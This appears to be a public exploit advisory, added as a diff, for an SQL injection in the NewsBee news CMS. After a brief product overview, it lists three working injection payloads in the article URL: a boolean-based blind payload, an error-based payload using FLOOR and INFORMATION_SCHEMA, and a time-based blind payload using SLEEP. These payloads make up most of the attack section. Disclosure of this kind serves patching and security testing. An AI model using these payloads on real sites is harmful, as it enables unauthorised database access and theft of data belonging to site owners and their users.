@@ -1,0 +1,32 @@
+Exploit Title: NewsBee CMS – SQL Injection
+Date: 06.02.2017
+Software Link: https://codecanyon.net/item/newsbee-fully-featured-news-cms-with-bootstrasp-php-mysql/19404937?s_rank=2
+Exploit Author: Kaan KAMIS
+Contact: iletisim[at]k2an[dot]com
+Website: http://k2an.com
+Category: Web Application Exploits
+
+Overview
+
+NewsBee is a Fully Featured News Site CMS (Content Management System). This CMS Includes almost everything you need to make a News Site easily and Creatively. The In build Features will help you to easily manage the site contents not only news articles, but also many other related contents which are commonly used in news sites.
+Vulnerabilities:
+
+SQL Injection
+
+URL : http://localhost/newsbee/30[payload]_news_thai_soccer_targets_asia_wide_goals.html
+
+Payload:
+---
+Parameter: #1* (URI)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: http://localhost/newsbee/30' AND 5694=5694 AND 'fpmw'='fpmw_news_thai_soccer_targets_asia_wide_goals.html
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: http://localhost/newsbee/30' AND (SELECT 4020 FROM(SELECT COUNT(*),CONCAT(0x717a767a71,(SELECT (ELT(4020=4020,1))),0x7170707171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'Tdxc'='Tdxc_news_thai_soccer_targets_asia_wide_goals.html
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 OR time-based blind
+    Payload: http://localhost/newsbee/30' OR SLEEP(5) AND 'VLvJ'='VLvJ_news_thai_soccer_targets_asia_wide_goals.html
+---
